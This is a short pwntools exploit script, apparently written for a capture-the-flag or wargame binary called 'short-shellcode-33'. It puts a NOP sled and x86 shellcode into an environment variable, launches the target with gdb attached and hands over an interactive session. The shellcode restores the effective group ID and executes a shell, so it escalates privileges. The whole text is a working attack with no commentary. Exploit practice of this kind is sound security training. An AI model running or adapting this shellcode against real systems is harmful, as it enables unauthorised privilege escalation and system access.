#!/usr/bin/python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']


env= {"SHELLCODE":'\x90' * 500 + 'j2X\x99\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2\xb0\x0bQjA\x89\xe3\xcd\x80'}

p = process('./short-shellcode-33', env=env)
gdb.attach(p, "b *main")

#p.recv()

p.interactive()
